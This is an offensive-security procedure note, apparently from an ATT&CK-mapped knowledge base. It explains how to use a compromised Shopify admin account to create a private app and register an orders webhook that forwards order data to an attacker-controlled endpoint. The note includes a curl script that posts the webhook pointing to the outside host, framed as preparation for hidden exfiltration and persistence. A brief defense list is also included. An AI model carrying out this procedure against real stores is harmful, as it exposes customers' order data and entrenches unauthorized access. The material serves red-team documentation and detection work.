---
tags:
  - shopify
  - webhook-creation
  - api-setup
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/create-shopify-webhook]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Cloud Account]]'
updated_at: '2025-12-14T17:32:11.035Z'
sub_techniques: []
id: afd7896c-306e-4b72-8b07-0f64e2d3fc1a
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Cloud Account]]'
---
# Create-Shopify-Private-App-and-Webhook

## Summary

This procedure sets up a private app in Shopify with read permissions for orders and creates a webhook to subscribe to order creation events, directing payloads to an external endpoint for potential exfiltration.

## Description

In a compromised Shopify account, attackers create a private app to obtain API credentials with read access to sensitive resources like orders. A webhook is then registered via the API to receive real-time notifications on events such as new orders. This establishes the foundation for persistence, as the webhook will later survive permission revocation. The target environment is the Shopify Admin API, requiring admin access. Expected outcomes include a functional webhook that delivers JSON-formatted event data to a controlled external server, enabling initial data capture.

## Requirements

1. Valid Shopify admin credentials with permission to create private apps
2. API credentials file (format: shop.myshopify.com:api_key:password)
3. External webhook receiver (e.g., requestb.in instance)
4. curl tool installed for API interactions

## Defense

Defensive measures and detection strategies:

- Regularly audit private apps and revoke unused API tokens
- Monitor webhook creation logs in Shopify admin for anomalous external addresses
- Implement webhook verification with secret tokens to prevent unauthorized deliveries
- Use API access logs to detect permission changes followed by event triggers

## Objectives

1. Establish API access via private app with read permissions
2. Register a persistent event listener for order data
3. Prepare for hidden exfiltration by pointing to attacker-controlled endpoint

## Instructions

### Step 1: Access Private Apps Administration

**Context**: Log in and navigate to create a new private app with necessary permissions.

**Instructions**: Log into Shopify admin, go to Settings > Apps and sales channels > Develop apps > Create an app. Grant read access to Orders.

> Generate API credentials from the app once created.

### Step 2: Create Webhook Using API

**Context**: Use the API to subscribe to orders/create events, ensuring the webhook points to an external URL.

**Command** ([[commands/create-shopify-webhook]]):

```bash
#!/bin/bash
creds=`cat ../creds`

curl -X POST "$creds/admin/webhooks.json" \
  -H "Content-Type: application/json" \
  -d @- << EOD
{
  "webhook": {
    "topic": "orders\\create",
    "address": "http://requestb.in/17m30us1",
    "format": "json"
  }
}
EOD

printf "\n"
```

> This command authenticates with credentials from a file, posts to the webhooks endpoint, and specifies the topic, address, and JSON format. Expected output is a JSON response with the webhook's ID and details, confirming successful creation.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Cloud Account]] Cloud Account: Service Account

### Sub-Techniques


## Commands Used

- [[commands/create-shopify-webhook]]

## Tools Used

- [[tools/curl]]

## Tags

- shopify
- webhook-creation
- api-setup
